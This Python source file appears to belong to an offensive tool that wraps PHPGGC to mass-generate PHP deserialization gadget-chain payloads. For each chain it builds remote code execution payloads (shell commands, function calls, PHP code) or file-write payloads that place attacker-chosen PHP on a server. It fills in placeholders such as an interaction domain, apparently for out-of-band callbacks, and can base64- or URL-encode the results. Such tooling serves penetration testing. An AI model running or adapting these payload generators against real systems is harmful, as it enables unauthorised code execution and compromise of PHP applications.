import os
import re
import logging
import urllib.parse
import base64
from .serializer import Serializer

class PHPGGC(Serializer):

    usage = 'PHPGGC: PHP Generic Gadget Chains'

    def __init__(self, bin, chainOpts):
        self.phpggcOpts = chainOpts.phpggc_options
        super().__init__(bin, chainOpts)

    def chains(self):
        chainsOutput = self.exec("-l").split('\n')
        pattern = r"^(?P<name>[\w\/]+)\s{3,}(?P<version>[^\s].+[^\s])\s{3,}(?P<type>[^\s].+[^\s])\s{3,}(?P<vector>[\w:]+)\s+.*$"
        regex = re.compile(pattern)
        chains = []
        for line in chainsOutput:
            match = regex.search(line)
            if not match: 
                continue
            chain = match.groupdict()
            if chain['name'] == 'NAME': 
                continue

            chains.append({
                'id': chain['name'].lower().replace('/', '-'),
                'name': chain['name'],
                'description': f"{chain['name']} {chain['type']}",
                'type': chain['type'],
            })
        return chains
    
    def payload(self, chainName, chainArgs):
        return self.exec(f"{self.phpggcOpts} {chainName} {chainArgs}", rawResult=True)
    
    def generate(self, chains, output):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        php_functions = self.chainOpts.php_functions
        php_code = self.getFileContentOrCode(self.chainOpts.php_code)
        remote_file = self.chainOpts.remote_file
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else php_code

        logging.info(f"System command: {system_command}")
        logging.info(f"PHP Functions: {php_functions}")
        logging.info(f"PHP Code: {self.chainOpts.php_code}")
        logging.info(f"File written on server: {remote_file}")
        logging.info(f"Content written on server: {remote_content}")
        logging.info(f"Interact domain: {interact_domain}")

        # create an empty file that will contain PHP file with the payload
        fp = self.createTemporaryFile(suffix='.php')
        if fp == None:
            return 0
        
        logging.info(f"Starting payload generation")
        count = 0
        for php_function in php_functions.split(','):

            logging.info(f"Generating payloads for {php_function}...")

            # generate payload for each chain
            for chain in chains:

                logging.info(f"[{chain['name']}] Generating payload of type '{chain['type']}'")

                chain_system_command = system_command
                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
                chain_system_command = chain_system_command.replace("'", "\\'")
                escaped_chain_system_command = chain_system_command.replace('"', '\\"')

                # chain argument
                if chain['type'] == "RCE: Command":
                    chainArguments = f"'{chain_system_command}'"
                elif chain['type'] == "RCE: Function Call":
                    chainArguments = f"'{php_function}' '{chain_system_command}'"
                elif chain['type'] == "RCE: PHP Code":
                    code = f'{php_function}("{escaped_chain_system_command}");'
                    chainArguments = f"'{code}'"
                elif chain['type'] == "File write":
                    with open(fp.name, mode='w') as ft:
                        content = remote_content
                        content = content.replace('%%system_command%%', chain_system_command)
                        content = content.replace('%%php_function%%', php_function)
                        content = content.replace('%%domain%%', interact_domain)
                        content = content.replace('%%chain_id%%', chain['id'])
                        ft.write(content)
                    chainArguments = f"'{remote_file.replace('%%ext%%', 'php')}' '{fp.name}'"
                else:
                    logging.debug(f"[{chain['name']}] Skipping unhandled chain type")
                    continue
                
                result = self.payload(chain['name'], chainArguments)
                if result.returncode != 0:
                    logging.error(f"[{chain['name']}] Failed to create payload")
                    if result.stderr != b'':
                        logging.error(result.stderr.decode('ascii'))
                    if result.stdout != b'':
                        logging.error(result.stdout.decode('ascii'))
                    continue

                payload = result.stdout
                
                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

                if self.chainOpts.base64:
                    payload = base64.b64encode(payload)
                
                if self.chainOpts.url:
                    payload = urllib.parse.quote_plus(payload).encode('ascii')

                output.write(payload+b"\n")
                count = count + 1    
            
        # cleanup temp file
        if os.path.exists(fp.name):
            logging.debug(f"Removing temporary file {fp.name}")
            os.remove(fp.name)

        return count